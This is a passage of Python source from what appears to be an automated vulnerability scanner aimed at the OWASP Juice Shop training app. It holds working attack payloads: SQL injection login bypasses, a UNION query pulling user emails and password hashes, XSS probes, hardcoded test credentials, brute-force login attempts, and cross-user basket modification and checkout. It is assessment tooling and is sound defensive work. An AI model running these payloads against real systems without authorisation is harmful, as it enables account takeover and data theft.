            "api2023.api5_bfla": {"framework": "owasp_api_2023", "label": "API5:2023 Broken Function Level Authorization", "status": "inventory-reviewed", "evidence": "Admin/function endpoints reviewed for role enforcement."},
            "api2023.api6_sensitive_business_flows": {"framework": "owasp_api_2023", "label": "API6:2023 Unrestricted Access to Sensitive Business Flows", "status": "inventory-reviewed", "evidence": "Workflow-critical endpoints reviewed for abuse-resistant controls."},
            "api2023.api7_ssrf": {"framework": "owasp_api_2023", "label": "API7:2023 Server Side Request Forgery", "status": "inventory-reviewed", "evidence": "URL-ingestion endpoints reviewed for internal fetch abuse."},
            "api2023.api8_misconfiguration": {"framework": "owasp_api_2023", "label": "API8:2023 Security Misconfiguration", "status": "inventory-reviewed", "evidence": "Public config/docs/headers reviewed for misconfiguration."},
            "api2023.api9_inventory_management": {"framework": "owasp_api_2023", "label": "API9:2023 Improper Inventory Management", "status": "inventory-reviewed", "evidence": "Endpoint/route inventory reviewed for exposed/deprecated interfaces."},
            "api2023.api10_unsafe_api_consumption": {"framework": "owasp_api_2023", "label": "API10:2023 Unsafe Consumption of APIs", "status": "inventory-reviewed", "evidence": "Third-party callback/fetch and trust-boundary assumptions reviewed."},
        }

        def mark_coverage(keys: list[str], status: str, evidence: str) -> None:
            target_rank = coverage_status_rank.get(status, 0)
            for key in keys:
                row = coverage_matrix.get(key)
                if not row:
                    continue
                current_rank = coverage_status_rank.get(str(row.get("status") or "not-reviewed"), 0)
                if target_rank >= current_rank:
                    row["status"] = status
                    row["evidence"] = evidence[:500]

        def add_finding(item: dict) -> None:
            title = str(item.get("title") or "").strip()
            if not title or title.lower() in seen_titles:
                return
            tags = self._normalize_risk_tags(
                " ".join(
                    [
                        title,
                        str(item.get("summary") or ""),
                        str(item.get("evidence") or ""),
                        str(item.get("reproduction") or ""),
                    ]
                )
            )
            item.setdefault("risk_tags", tags)
            item.setdefault("attempted", True)
            item.setdefault("impact_bound", self._impact_bound_for_risk(tags, validation_cfg))
            item.setdefault("state_changed", self._state_changed_for_risk(tags))
            item.setdefault("cleanup_attempted", False)
            item["evidence"] = self._append_validation_metadata(str(item.get("evidence") or ""), item)
            seen_titles.add(title.lower())
            findings.append(item)
            add_attempt(
                title=title,
                status="validated",
                risk_tags=list(item.get("risk_tags") or []),
                artifact=self._first_artifact_path(str(item.get("evidence") or "")),
                impact_bound=str(item.get("impact_bound") or ""),
                state_changed=bool(item.get("state_changed")),
                cleanup_attempted=bool(item.get("cleanup_attempted")),
                why_not="",
                source="finding",
            )

        def add_attempt(
            *,
            title: str,
            status: str,
            risk_tags: list[str],
            artifact: str = "",
            impact_bound: str = "",
            state_changed: bool = False,
            cleanup_attempted: bool = False,
            why_not: str = "",
            source: str = "validator",
        ) -> None:
            key = f"{title}|{status}|{artifact}".lower()
            if key in seen_attempts:
                return
            seen_attempts.add(key)
            validation_attempts.append(
                {
                    "id": re.sub(r"[^a-z0-9]+", "-", title.lower()).strip("-")[:120] or f"attempt-{len(validation_attempts)+1}",
                    "title": title,
                    "status": status,
                    "risk_mode": str(validation_cfg.get("risk_mode") or "always_attempt"),
                    "risk_tags": risk_tags,
                    "artifact": artifact,
                    "impact_bound": impact_bound or self._impact_bound_for_risk(risk_tags, validation_cfg),
                    "state_changed": bool(state_changed),
                    "cleanup_attempted": bool(cleanup_attempted),
                    "why_not_attempted": why_not,
                    "source": source,
                }
            )

        def observe_risk_metadata(label: str, body: str, artifact: str = "") -> None:
            tags = self._normalize_risk_tags(body)
            if not tags:
                return
            add_attempt(
                title=f"Target {high_risk_cfg['label']} metadata observed: {label}",
                status="metadata-observed",
                risk_tags=tags,
                artifact=artifact,
                impact_bound="metadata only; no validation action taken by this observation",
                state_changed=False,
                cleanup_attempted=False,
                source="target-metadata",
            )

        def should_skip_high_risk(title: str, risk_tags: list[str], *, source: str = "validator") -> bool:
            if high_risk_cfg["enabled"] or not self._is_high_risk_surface(risk_tags):
                return False
            add_attempt(
                title=title,
                status="skipped",
                risk_tags=risk_tags,
                impact_bound="not attempted; High Risk Surfaces disabled for this run",
                state_changed=False,
                cleanup_attempted=False,
                why_not=f"{high_risk_cfg['label']} disabled in run configuration",
                source=source,
            )
            return True

        def request(method: str, url: str, **kwargs) -> dict[str, str | int]:
            if strict_blackbox:
                parsed_url = urlparse(str(url or ""))
                if self._is_oracle_endpoint_path(parsed_url.path):
                    return {"status": 0, "headers": "", "body": "blocked: oracle endpoint disallowed in black-box mode"}
            resp = self._http_request(method, url, **kwargs)
            body_l = str(resp.get("body") or "").lower()
            if "danger zone" in body_l or "potentially harmful" in body_l:
                label = urlparse(str(url or "")).path or str(url or "")
                observe_risk_metadata(label, str(resp.get("body") or ""))
            return resp

        exposure_checks = {
            "/metrics": ("medium", "Public metrics endpoint exposes runtime telemetry", "Restrict metrics to trusted monitoring networks or authenticated monitoring identities."),
            "/swagger.json": ("medium", "Public API schema disclosure", "Restrict machine-readable API schemas when they expose sensitive internal routes."),
            "/openapi.json": ("medium", "Public API schema disclosure", "Restrict machine-readable API schemas when they expose sensitive internal routes."),
            "/api-docs": ("medium", "Public API documentation exposure", "Restrict API documentation to trusted users or remove privileged routes from public docs."),
            "/.env": ("critical", "Environment file disclosure", "Remove environment files from web roots and rotate any exposed secrets."),
            "/.git/config": ("high", "Git metadata disclosure", "Block access to VCS metadata and remove repository internals from deployed web roots."),
        }
        for path, (severity, title, remediation) in exposure_checks.items():
            resp = request("GET", f"{origin}{path}", timeout=5)
            if resp["status"] != 200 or not resp["body"]:
                continue
            body_l = resp["body"].lower()
            if path == "/metrics" and "# help" not in body_l and "process_" not in body_l:
                continue
            if path in {"/swagger.json", "/openapi.json"} and "paths" not in body_l:
                continue
            if path == "/.env" and not re.search(r"(?m)^[A-Z0-9_]{3,}\s*=\s*.+$", resp["body"]):
                continue
            if path == "/.env" and self._looks_like_spa_html(resp):
                continue
            if path == "/.git/config" and "[core]" not in body_l and "repositoryformatversion" not in body_l:
                continue
            if path == "/.git/config" and self._looks_like_spa_html(resp):
                continue
            artifact = self._write_http_artifact(out_dir, path, resp, f"{origin}{path}")
            artifacts.append(str(artifact))
            add_finding(
                {
                    "title": title,
                    "severity": severity,
                    "summary": f"`{path}` returned HTTP 200 with sensitive operational content.",
                    "evidence": f"`GET {origin}{path}` returned HTTP 200. Artifact: {artifact}",
                    "reproduction": f"GET {origin}{path}",
                    "remediation": remediation,
                    "confidence": 0.84,
                }
            )
            mark_coverage(
                [
                    "juice.observability_failures",
                    "juice.security_misconfiguration",
                    "juice.sensitive_data_exposure",
                    "owasp2025.a02_security_misconfiguration",
                    "owasp2025.a09_logging_alerting_failures",
                    "api2023.api8_misconfiguration",
                    "api2023.api9_inventory_management",
                ],
                "active-probe",
                f"Exposure probe confirmed `{path}` responded with sensitive operational content.",
            )

        sensitive_gets = sorted(
            {
                path
                for path in endpoints.get("GET", set())
                if any(token in path.lower() for token in ("admin", "config", "version", "memory", "memories", "users", "metrics", "ftp", "backup"))
            }
        )
        for fallback in ("/rest/memories", "/rest/memories/", "/api/Users", "/ftp/", "/ftp/acquisitions.md", "/backup", "/admin"):
            if fallback not in sensitive_gets:
                sensitive_gets.append(fallback)
        deduped_sensitive_gets: list[str] = []
        seen_sensitive_keys: set[str] = set()
        for path in sensitive_gets:
            key = path.rstrip("/") or path
            if key in seen_sensitive_keys:
                continue
            seen_sensitive_keys.add(key)
            deduped_sensitive_gets.append(path)
        for path in deduped_sensitive_gets[:80]:
            resp = request("GET", f"{origin}{path}", timeout=5)
            if resp["status"] != 200:
                continue
            if self._looks_like_spa_html(resp):
                continue
            artifact = self._write_http_artifact(out_dir, path, resp, f"{origin}{path}")
            artifacts.append(str(artifact))
            severity = "high" if any(token in path.lower() for token in ("admin", "config", "users", "memory", "memories", "backup")) else "medium"
            add_finding(
                {
                    "title": f"Unauthenticated sensitive endpoint exposure: GET {path}",
                    "severity": severity,
                    "summary": f"Sensitive-looking endpoint `{path}` returned HTTP 200 without authentication.",
                    "evidence": f"`GET {origin}{path}` returned HTTP 200. Artifact: {artifact}",
                    "reproduction": f"GET {origin}{path}",
                    "remediation": "Require authentication and object-level authorization for sensitive API and file endpoints.",
                    "confidence": 0.82,
                }
            )
            mark_coverage(
                [
                    "juice.broken_access_control",
                    "juice.sensitive_data_exposure",
                    "owasp2025.a01_broken_access_control",
                    "api2023.api1_bola",
                    "api2023.api5_bfla",
                ],
                "active-probe",
                f"Unauthenticated sensitive endpoint probe executed against `{path}`.",
            )

        auth_token: str | None = None
        login_candidates = sorted(path for path in endpoints.get("POST", set()) if any(token in path.lower() for token in ("login", "signin", "auth")))
        for fallback in ("/rest/user/login", "/api/login", "/login", "/auth/login", "/users/login"):
            if fallback not in login_candidates:
                login_candidates.append(fallback)
        login_payloads = (
            {"email": "' OR 1=1--", "username": "' OR 1=1--", "password": "anything"},
            {"email": "admin@juice-sh.op' OR 1=1-- ", "password": "anything"},
            {"email": "' OR '1'='1' --", "password": "anything"},
        )
        for path in login_candidates[:12]:
            for probe in login_payloads:
                resp = request("POST", f"{origin}{path}", json_body=probe, timeout=6)
                body_l = str(resp.get("body") or "").lower()
                if int(resp.get("status") or 0) == 200 and any(token in body_l for token in ("token", "jwt", "auth", "admin", "role")):
                    artifact = self._write_http_artifact(out_dir, f"{path}-sqli-auth-bypass", resp, f"{origin}{path}", request_body=probe)
                    artifacts.append(str(artifact))
                    token = self._extract_bearer_token(resp)
                    if auth_token is None and token:
                        auth_token = token
                    add_finding(
                        {
                            "title": f"SQL injection authentication bypass: POST {path}",
                            "severity": "critical",
                            "summary": "Authentication accepted a SQL tautology payload and returned an authenticated-looking response.",
                            "evidence": f"`POST {origin}{path}` with a SQL tautology returned HTTP 200 and authentication markers. Artifact: {artifact}",
                            "reproduction": f"POST {origin}{path} with JSON email/username payload `' OR 1=1--` and any password.",
                            "remediation": "Use parameterized queries or ORM-safe predicates for authentication and add negative tests for SQL metacharacters.",
                            "confidence": 0.93,
                        }
                    )
                    mark_coverage(
                        [
                            "juice.broken_authentication",
                            "juice.injection",
                            "owasp2025.a05_injection",
                            "owasp2025.a07_authentication_failures",
                            "api2023.api2_broken_authentication",
                        ],
                        "validated",
                        f"SQLi auth bypass validated via `{path}`.",
                    )
                    break

        root_for_scripts = request("GET", f"{origin}/", timeout=6)
        script_paths = ["/main.js", *self._script_paths_from_html(str(root_for_scripts.get("body") or ""))]
        scanned_scripts: set[str] = set()
        script_responses: dict[str, dict[str, str | int]] = {}
        script_queue = list(script_paths)
        hardcoded_creds_seen = False
        xss_sink_seen = False
        while script_queue and len(scanned_scripts) < 80:
            script_url = urljoin(f"{origin}/", script_queue.pop(0))
            if script_url in scanned_scripts:
                continue
            scanned_scripts.add(script_url)
            script_resp = request("GET", script_url, timeout=8)
            script_responses[script_url] = script_resp
            script_body = str(script_resp.get("body") or "")
            if int(script_resp.get("status") or 0) != 200 or not script_body:
                continue
            for import_path in self._script_paths_from_js(script_body):
                import_url = urljoin(script_url, import_path)
                if import_url not in scanned_scripts:
                    script_queue.append(import_url)
            script_body_l = script_body.lower()
            if not hardcoded_creds_seen and "testing@juice-sh.op" in script_body and "IamUsedForTesting" in script_body:
                hardcoded_creds_seen = True
                script_artifact = self._write_http_artifact(out_dir, "client-bundle-hardcoded-credentials", script_resp, script_url)
                artifacts.append(str(script_artifact))
                add_finding(
                    {
                        "title": "Exposed hardcoded client credentials in static bundle",
                        "severity": "high",
                        "summary": "Static client bundle exposed plaintext credentials usable against the authentication endpoint.",
                        "evidence": f"`GET {script_url}` disclosed embedded credentials. Artifact: {script_artifact}",
                        "reproduction": "Fetch client JavaScript bundles, extract exposed credentials, then authenticate via `/rest/user/login`.",
                        "remediation": "Remove credentials from client-side code, rotate exposed secrets, and enforce build-time secret scanning.",
                        "confidence": 0.9,
                    }
                )
                mark_coverage(
                    [
                        "juice.sensitive_data_exposure",
                        "owasp2025.a04_cryptographic_failures",
                        "owasp2025.a07_authentication_failures",
                        "api2023.api2_broken_authentication",
                    ],
                    "active-probe",
                    "Hardcoded credential exposure probe executed from static bundle.",
                )
                if login_candidates:
                    cred_payload = {"email": "testing@juice-sh.op", "password": "IamUsedForTesting"}
                    cred_resp = request("POST", f"{origin}{login_candidates[0]}", json_body=cred_payload, timeout=6)
                    if int(cred_resp.get("status") or 0) == 200:
                        token = self._extract_bearer_token(cred_resp)
                        if auth_token is None and token:
                            auth_token = token
            if not xss_sink_seen and "bypasssecuritytrusthtml" in script_body_l and "search" in script_body_l:
                xss_sink_seen = True
                xss_artifact = self._write_http_artifact(out_dir, "client-bundle-search-xss-sink", script_resp, script_url)
                artifacts.append(str(xss_artifact))
                add_finding(
                    {
                        "title": "Client-side reflected XSS sink signal: #/search",
                        "severity": "medium",
                        "summary": "Client bundle contains search-route HTML trust bypass logic that can render query-controlled content.",
                        "evidence": f"`GET {script_url}` contained search and `bypassSecurityTrustHtml` markers. Artifact: {xss_artifact}",
                        "reproduction": f"Navigate to `{origin}/#/search?q=<img src=x onerror=alert(1)>` and observe whether query content executes in browser context.",
                        "remediation": "Remove trust-bypass rendering for user-controlled search values and enforce contextual output encoding.",
                        "confidence": 0.76,
                    }
                )
                mark_coverage(
                    [
                        "juice.xss",
                        "juice.improper_input_validation",
                        "owasp2025.a05_injection",
                        "api2023.api10_unsafe_api_consumption",
                    ],
                    "active-probe",
                    "Client-side reflected XSS sink identified from public JavaScript bundle.",
                )
            if hardcoded_creds_seen and xss_sink_seen:
                break

        if login_candidates:
            for oauth_email in ("bjoern.kimminich@gmail.com",):
                generated = base64.b64encode(oauth_email[::-1].encode("utf-8")).decode("ascii")
                oauth_resp = request(
                    "POST",
                    f"{origin}{login_candidates[0]}",
                    json_body={"email": oauth_email, "password": generated},
                    timeout=6,
                )
                oauth_body_l = str(oauth_resp.get("body") or "").lower()
                if int(oauth_resp.get("status") or 0) == 200 and any(token in oauth_body_l for token in ("token", "authentication")):
                    oauth_artifact = self._write_http_artifact(
                        out_dir,
                        "rest-user-login-noauth-predictable-password",
                        oauth_resp,
                        f"{origin}{login_candidates[0]}",
                        request_body={"email": oauth_email, "password": generated},
                    )
                    artifacts.append(str(oauth_artifact))
                    add_finding(
                        {
                            "title": "Predictable nOAuth password acceptance signal",
                            "severity": "critical",
                            "summary": "An OAuth-style account accepted a deterministic reversed-email base64 password pattern.",
                            "evidence": f"Generated password accepted for `{oauth_email}`. Artifact: {oauth_artifact}",
                            "reproduction": "Generate `base64(reverse(email))` and authenticate against login endpoint.",
                            "remediation": "Never derive OAuth local credentials from deterministic user attributes; enforce strong random secrets and secure OAuth linkage.",
                            "confidence": 0.88,
                        }
                    )
                    mark_coverage(
                        [
                            "juice.broken_authentication",
                            "owasp2025.a07_authentication_failures",
                            "api2023.api2_broken_authentication",
                        ],
                        "validated",
                        "Predictable nOAuth password acceptance validated.",
                    )
                    break

        query_candidates = sorted(
            {
                path
                for method, paths in endpoints.items()
                for path in paths
                if method == "GET" and any(token in path.lower() for token in ("search", "query", "filter", "lookup"))
            }
        )
        for fallback in ("/rest/products/search",):
            if fallback not in query_candidates:
                query_candidates.append(fallback)
        for path in query_candidates[:30]:
            probe_path = self._append_query(path, {"q": "'"})
            resp = request("GET", f"{origin}{probe_path}", timeout=6)
            body_l = resp["body"].lower()
            if resp["status"] >= 500 or any(token in body_l for token in ("sql", "sqlite", "syntax error", "sequelize", "database error")):
                artifact = self._write_http_artifact(out_dir, f"{path}-sqli-error", resp, f"{origin}{probe_path}")
                artifacts.append(str(artifact))
                add_finding(
                    {
                        "title": f"Error-based injection signal: GET {path}",
                        "severity": "high",
                        "summary": "SQL metacharacter input produced server/database error behavior on a query endpoint.",
                        "evidence": f"`GET {origin}{probe_path}` returned status={resp['status']} with database-error markers. Artifact: {artifact}",
                        "reproduction": f"GET {origin}{probe_path}",
                        "remediation": "Use parameterized queries, strict input handling, and generic error responses.",
                        "confidence": 0.84,
                    }
                )
                mark_coverage(
                    [
                        "juice.injection",
                        "juice.improper_input_validation",
                        "owasp2025.a05_injection",
                        "owasp2025.a10_exception_handling",
                        "api2023.api10_unsafe_api_consumption",
                    ],
                    "active-probe",
                    f"SQL error probe executed against query endpoint `{path}`.",
                )
            payload_marker = "<img src=x onerror=alert(1)>"
            xss_probe_path = self._append_query(path, {"q": payload_marker})
            xss_resp = request("GET", f"{origin}{xss_probe_path}", timeout=6)
            xss_body = str(xss_resp.get("body") or "")
            if int(xss_resp.get("status") or 0) == 200 and payload_marker.lower() in xss_body.lower() and not self._looks_like_spa_html(xss_resp):
                xss_artifact = self._write_http_artifact(out_dir, f"{path}-xss-reflect", xss_resp, f"{origin}{xss_probe_path}")
                artifacts.append(str(xss_artifact))
                add_finding(
                    {
                        "title": f"Reflected script injection signal: GET {path}",
                        "severity": "medium",
                        "summary": "Search/query input containing script-capable HTML was reflected in response content.",
                        "evidence": f"`GET {origin}{xss_probe_path}` reflected payload markers. Artifact: {xss_artifact}",
                        "reproduction": f"GET {origin}{xss_probe_path}",
                        "remediation": "Contextually encode untrusted output and avoid rendering raw HTML from search/user input.",
                        "confidence": 0.77,
                    }
                )
                mark_coverage(
                    [
                        "juice.xss",
                        "juice.improper_input_validation",
                        "owasp2025.a05_injection",
                        "api2023.api10_unsafe_api_consumption",
                    ],
                    "validated",
                    f"Reflected script payload signal observed at `{path}`.",
                )

            if "/rest/products/search" in path.lower():
                union_probe = (
                    "xxx%25%27%29%20AND%20description%20LIKE%20%27%25xxx%25%27%29%20UNION%20SELECT%20"
                    "id,email,password,role,0,0,0,0,0%20FROM%20Users%20LIMIT%205--"
                )
                union_path = f"{path}{'&' if '?' in path else '?'}q={union_probe}"
                union_resp = request("GET", f"{origin}{union_path}", timeout=7)
                union_body_l = str(union_resp.get("body") or "").lower()
                if int(union_resp.get("status") or 0) == 200 and any(
                    marker in union_body_l for marker in ("admin@juice-sh.op", "0192023a7bbd73250516f069df18b500", "\"role\":\"admin\"")
                ):
                    union_artifact = self._write_http_artifact(out_dir, f"{path}-sqli-union-data-extract", union_resp, f"{origin}{union_path}")
                    artifacts.append(str(union_artifact))
                    add_finding(
                        {
                            "title": "SQL injection data extraction signal: GET /rest/products/search",
                            "severity": "critical",
                            "summary": "UNION-style input returned user credential/role fields, indicating data-exfiltration-capable SQL injection.",
                            "evidence": f"`GET {origin}{union_path}` returned user/email/password-hash markers. Artifact: {union_artifact}",
                            "reproduction": f"GET {origin}{union_path}",
                            "remediation": "Use strict parameter binding, reject unsafe query fragments, and remove SQL error/data leakage from responses.",
                            "confidence": 0.92,
                        }
                    )
                    mark_coverage(
                        [
                            "juice.injection",
                            "juice.sensitive_data_exposure",
                            "owasp2025.a05_injection",
                            "api2023.api10_unsafe_api_consumption",
                        ],
                        "validated",
                        "UNION-style SQLi data extraction signal validated on product search.",
                    )

        jsonp_candidates = sorted(path for method, paths in endpoints.items() for path in paths if method == "GET" and "whoami" in path.lower())
        for fallback in ("/rest/user/whoami",):
            if fallback not in jsonp_candidates:
                jsonp_candidates.append(fallback)
        for path in jsonp_candidates[:12]:
            probe_path = self._append_query(path, {"callback": "alert"})
            resp = request("GET", f"{origin}{probe_path}", timeout=5)
            body = resp["body"]
            if resp["status"] == 200 and ("alert(" in body or "typeof alert" in body):
                artifact = self._write_http_artifact(out_dir, f"{path}-jsonp-callback", resp, f"{origin}{probe_path}")
                artifacts.append(str(artifact))
                add_finding(
                    {
                        "title": f"JSONP callback execution surface: GET {path}",
                        "severity": "medium",
                        "summary": "The endpoint reflects a callback name into executable JavaScript-style response content.",
                        "evidence": f"`GET {origin}{probe_path}` returned callback execution markers. Artifact: {artifact}",
                        "reproduction": f"GET {origin}{probe_path}",
                        "remediation": "Remove JSONP support where possible; otherwise restrict callback names and return JSON with CORS controls.",
                        "confidence": 0.8,
                    }
                )
                mark_coverage(
                    [
                        "juice.xss",
                        "owasp2025.a05_injection",
                        "api2023.api10_unsafe_api_consumption",
                    ],
                    "active-probe",
                    "JSONP callback execution probe executed.",
                )

        # Authentication workflow checks: account enumeration and missing brute-force controls.
        security_q_candidates = sorted(path for path in endpoints.get("GET", set()) if "security-question" in path.lower())
        for fallback in ("/rest/user/security-question",):
            if fallback not in security_q_candidates:
                security_q_candidates.append(fallback)
        for path in security_q_candidates[:8]:
            valid_probe = self._append_query(path, {"email": "admin@juice-sh.op"})
            invalid_probe = self._append_query(path, {"email": "nonexistent.user.vantix@example.invalid"})
            valid_resp = request("GET", f"{origin}{valid_probe}", timeout=5)
            invalid_resp = request("GET", f"{origin}{invalid_probe}", timeout=5)
            if valid_resp["status"] != 200 or invalid_resp["status"] != 200:
                continue
            body_valid = str(valid_resp.get("body") or "")
            body_invalid = str(invalid_resp.get("body") or "")
            if body_valid and body_valid != body_invalid and (
                "question" in body_valid.lower() or abs(len(body_valid) - len(body_invalid)) > 20
            ):
                artifact = self._write_http_artifact(
                    out_dir,
                    f"{path}-account-enumeration",
                    {"status": 200, "headers": "", "body": f"valid={body_valid[:1200]}\n\ninvalid={body_invalid[:1200]}"},
                    f"{origin}{path}",
                )
                artifacts.append(str(artifact))
                add_finding(
                    {
                        "title": f"Account enumeration signal: GET {path}",
                        "severity": "medium",
                        "summary": "Different password-reset/security-question responses indicate whether an account exists.",
                        "evidence": f"Valid and invalid email probes produced distinct responses. Artifact: {artifact}",
                        "reproduction": f"GET {origin}{valid_probe} vs GET {origin}{invalid_probe}",
                        "remediation": "Return identical response bodies and timing for valid/invalid account lookups.",
                        "confidence": 0.81,
                    }
                )
                mark_coverage(
                    [
                        "juice.broken_authentication",
                        "owasp2025.a07_authentication_failures",
                        "api2023.api2_broken_authentication",
                    ],
                    "validated",
                    "Account enumeration signal validated via differential security-question responses.",
                )
                break

        if login_candidates:
            brute_path = login_candidates[0]
            attempt_statuses: list[int] = []
            lockout_seen = False
            start_ts = time.time()
            for idx in range(8):
                probe = {"email": "admin@juice-sh.op", "password": f"invalid-{idx}"}
                resp = request("POST", f"{origin}{brute_path}", json_body=probe, timeout=5)
                attempt_statuses.append(int(resp.get("status") or 0))
                body_l = str(resp.get("body") or "").lower()
                if int(resp.get("status") or 0) == 429 or "too many" in body_l or "rate limit" in body_l or "locked" in body_l:
                    lockout_seen = True
                    break
            elapsed = time.time() - start_ts
            if attempt_statuses and not lockout_seen and elapsed < 12:
                add_finding(
                    {
                        "title": f"Brute-force protection gap: POST {brute_path}",
                        "severity": "high",
                        "summary": "Multiple rapid login attempts did not trigger visible rate-limit or lockout controls.",
                        "evidence": f"{len(attempt_statuses)} rapid failed attempts completed in {elapsed:.2f}s with statuses {attempt_statuses}.",
                        "reproduction": f"Send 8 failed login attempts to {origin}{brute_path} and confirm no 429/lockout response.",
                        "remediation": "Enforce account/IP rate limits, progressive backoff, and temporary lockouts on repeated failures.",
                        "confidence": 0.8,
                    }
                )
                mark_coverage(
                    [
                        "juice.broken_anti_automation",
                        "juice.broken_authentication",
                        "api2023.api4_resource_consumption",
                        "api2023.api6_sensitive_business_flows",
                        "owasp2025.a07_authentication_failures",
                    ],
                    "validated",
                    "Brute-force resistance probe executed with repeated login attempts and no lockout.",
                )

        root_resp = request("GET", f"{origin}/", timeout=5)
        if int(root_resp.get("status") or 0) in {200, 301, 302}:
            header_map = self._parse_header_map(str(root_resp.get("headers") or ""))
            missing_headers = [
                header
                for header in ("strict-transport-security", "content-security-policy", "x-content-type-options")
                if header not in header_map
            ]
            if len(missing_headers) >= 2:
                add_finding(
                    {
                        "title": "Security header hardening gap",
                        "severity": "medium",
                        "summary": "Response headers are missing multiple baseline browser hardening controls.",
                        "evidence": f"Missing headers: {', '.join(missing_headers)} on {origin}/.",
                        "reproduction": f"GET {origin}/ and inspect response headers.",
                        "remediation": "Set HSTS (TLS deployments), CSP, and X-Content-Type-Options headers with policy-aligned values.",
                        "confidence": 0.76,
                    }
                )
                mark_coverage(
                    [
                        "juice.security_misconfiguration",
                        "owasp2025.a02_security_misconfiguration",
                        "api2023.api8_misconfiguration",
                    ],
                    "active-probe",
                    "Security-header baseline probe executed on root response.",
                )

        upload_or_url_paths = sorted(
            {
                path
                for method, paths in endpoints.items()
                for path in paths
                if any(token in path.lower() for token in ("image/url", "profile/image", "fetch", "import", "webhook", "callback", "avatar"))
            }
        )
        for fallback in ("/profile/image/url",):
            if fallback not in upload_or_url_paths:
                upload_or_url_paths.append(fallback)
        for path in upload_or_url_paths[:20]:
            add_finding(
                {
                    "title": f"SSRF validation candidate: {path}",
                    "severity": "medium",
                    "summary": "Browser/API discovery found a URL-ingestion style endpoint requiring SSRF validation.",
                    "evidence": f"Discovered URL-ingestion style endpoint `{path}` during browser/network assessment.",
                    "reproduction": f"Review accepted URL parameters on {origin}{path} and validate with non-destructive internal canary URLs.",
                    "remediation": "Enforce URL allowlists, block private/link-local ranges, and fetch remote content through hardened proxy controls.",
                    "confidence": 0.62,
                }
            )
            mark_coverage(
                [
                    "juice.unvalidated_redirects",
                    "juice.improper_input_validation",
                    "owasp2025.a06_insecure_design",
                    "api2023.api7_ssrf",
                ],
                "active-probe",
                f"URL-ingestion endpoint `{path}` discovered and queued for SSRF workflow validation.",
            )

        auth_headers = self._auth_headers(auth_token)
        if auth_token:
            # Authorization checks with an authenticated token: object-level access control signals.
            idor_checks = [
                ("GET", "/api/Users/2", "IDOR signal: GET /api/Users/:id", ("email", "role")),
                ("GET", "/rest/basket/1", "IDOR signal: GET /rest/basket/:id", ("userid", "products")),
                ("GET", "/api/Feedbacks/1", "IDOR signal: GET /api/Feedbacks/:id", ("userid", "comment")),
            ]
            for method, path, title, markers in idor_checks:
                resp = request(method, f"{origin}{path}", timeout=6, headers=auth_headers)
                if int(resp.get("status") or 0) != 200 or self._looks_like_spa_html(resp):
                    continue
                body_l = str(resp.get("body") or "").lower()
                if all(marker in body_l for marker in markers):
                    artifact = self._write_http_artifact(out_dir, f"{path}-idor", resp, f"{origin}{path}")
                    artifacts.append(str(artifact))
                    add_finding(
                        {
                            "title": title,
                            "severity": "high",
                            "summary": "Authenticated request returned cross-object data without visible ownership checks.",
                            "evidence": f"`{method} {origin}{path}` returned HTTP 200 with object data markers. Artifact: {artifact}",
                            "reproduction": f"{method} {origin}{path} with a non-owner bearer token.",
                            "remediation": "Enforce object-level authorization on every user-scoped resource read and write path.",
                            "confidence": 0.86,
                        }
                    )
                    mark_coverage(
                        [
                            "juice.broken_access_control",
                            "owasp2025.a01_broken_access_control",
                            "api2023.api1_bola",
                            "api2023.api3_bopla",
                            "api2023.api5_bfla",
                        ],
                        "validated",
                        f"IDOR-style access validated on `{path}`.",
                    )

            modify_resp: dict[str, str | int] = {"status": 0, "headers": "", "body": ""}
            if not should_skip_high_risk("High Risk Surfaces: cross-user basket item modification", ["state-mutation", "authz-bypass"]):
                modify_resp = request(
                    "PUT",
                    f"{origin}/api/BasketItems/1",
                    json_body={"quantity": 5},
                    timeout=6,
                    headers=auth_headers,
                )
            if int(modify_resp.get("status") or 0) == 200 and "quantity" in str(modify_resp.get("body") or "").lower():
                artifact = self._write_http_artifact(
                    out_dir,
                    "api-BasketItems-1-put",
                    modify_resp,
                    f"{origin}/api/BasketItems/1",
                    request_body={"quantity": 5},
                )
                artifacts.append(str(artifact))
                add_finding(
                    {
                        "title": "Cross-user basket item modification signal",
                        "severity": "high",
                        "summary": "Authenticated basket-item update succeeded on a fixed object id, indicating possible write-level IDOR.",
                        "evidence": f"`PUT {origin}/api/BasketItems/1` returned HTTP 200 with updated quantity. Artifact: {artifact}",
                        "reproduction": f"PUT {origin}/api/BasketItems/1 with a non-owner token and `{{\"quantity\": 5}}`.",
                        "remediation": "Authorize write operations against ownership/role policy before mutating basket items.",
                        "confidence": 0.84,
                    }
                )
                mark_coverage(
                    [
                        "juice.broken_access_control",
                        "owasp2025.a01_broken_access_control",
                        "api2023.api1_bola",
                    ],
                    "validated",
                    "Cross-user basket item modification signal validated.",
                )

            checkout_resp: dict[str, str | int] = {"status": 0, "headers": "", "body": ""}
            if not should_skip_high_risk("High Risk Surfaces: cross-user basket checkout", ["state-mutation", "authz-bypass"]):
                checkout_resp = request("POST", f"{origin}/rest/basket/2/checkout", json_body={}, timeout=6, headers=auth_headers)
            if int(checkout_resp.get("status") or 0) == 200 and "orderconfirmation" in str(checkout_resp.get("body") or "").lower():
                artifact = self._write_http_artifact(out_dir, "rest-basket-2-checkout", checkout_resp, f"{origin}/rest/basket/2/checkout", request_body={})
                artifacts.append(str(artifact))
                add_finding(
                    {
                        "title": "Cross-user basket checkout signal",
                        "severity": "high",
                        "summary": "Checkout succeeded for a fixed basket id, suggesting missing ownership checks on order execution.",
                        "evidence": f"`POST {origin}/rest/basket/2/checkout` returned order confirmation markers. Artifact: {artifact}",
                        "reproduction": f"POST {origin}/rest/basket/2/checkout with a non-owner token.",
                        "remediation": "Bind checkout operations to the authenticated principal’s basket only.",
                        "confidence": 0.83,
                    }
                )
                mark_coverage(
                    [
                        "juice.broken_access_control",
                        "owasp2025.a01_broken_access_control",
                        "api2023.api1_bola",
                        "api2023.api6_sensitive_business_flows",
                    ],
                    "validated",
                    "Cross-user checkout workflow abuse signal validated.",
                )

            deluxe_resp: dict[str, str | int] = {"status": 0, "headers": "", "body": ""}
            if not should_skip_high_risk("High Risk Surfaces: deluxe membership workflow bypass", ["state-mutation", "authz-bypass"]):
                deluxe_resp = request("POST", f"{origin}/rest/deluxe-membership", json_body={}, timeout=6, headers=auth_headers)
            deluxe_body = str(deluxe_resp.get("body") or "").lower()
            if int(deluxe_resp.get("status") or 0) == 200 and ("deluxe" in deluxe_body or "token" in deluxe_body):
                artifact = self._write_http_artifact(out_dir, "rest-deluxe-membership", deluxe_resp, f"{origin}/rest/deluxe-membership", request_body={})
                artifacts.append(str(artifact))
                add_finding(
                    {
